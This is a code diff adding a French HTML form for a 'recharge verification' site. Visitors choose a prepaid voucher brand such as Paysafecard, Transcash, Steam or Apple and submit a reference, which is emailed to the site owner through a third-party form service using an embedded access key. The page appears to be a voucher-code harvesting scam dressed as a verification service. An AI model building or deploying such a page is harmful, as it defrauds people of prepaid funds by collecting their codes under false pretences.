@@ -1,0 +1,34 @@
+<form action="https://api.web3forms.com/submit" method="POST">
+
+  <input type="hidden" name="access_key" value="3eb89050-0397-4889-aa1c-d404f232fac1">
+
+  <input type="hidden" name="subject" value="Nouvelle demande de vérification">
+
+  <input type="hidden" name="from_name" value="Site Vérification de recharge">
+
+  <input type="hidden" name="fournisseur" id="providerInput" value="Paysafecard">
+
+  <label>Fournisseur</label>
+
+  <div class="providers">
+    <button type="button" class="provider active" data-provider="Paysafecard">💳 Paysafecard</button>
+    <button type="button" class="provider" data-provider="Transcash">💶 Transcash</button>
+    <button type="button" class="provider" data-provider="Xbox">🎮 Xbox</button>
+    <button type="button" class="provider" data-provider="Steam">🎮 Steam</button>
+    <button type="button" class="provider" data-provider="Apple">🍎 Apple</button>
+    <button type="button" class="provider" data-provider="Google Play">▶️ Google Play</button>
+  </div>
+
+  <label for="message">Référence ou message</label>
+
+  <textarea
+    id="message"
+    name="message"
+    rows="4"
+    placeholder="Écrivez votre référence ou votre message ici"
+    required
+  ></textarea>
+
+  <button type="submit">🔍 Envoyer la demande</button>
+
+</form>
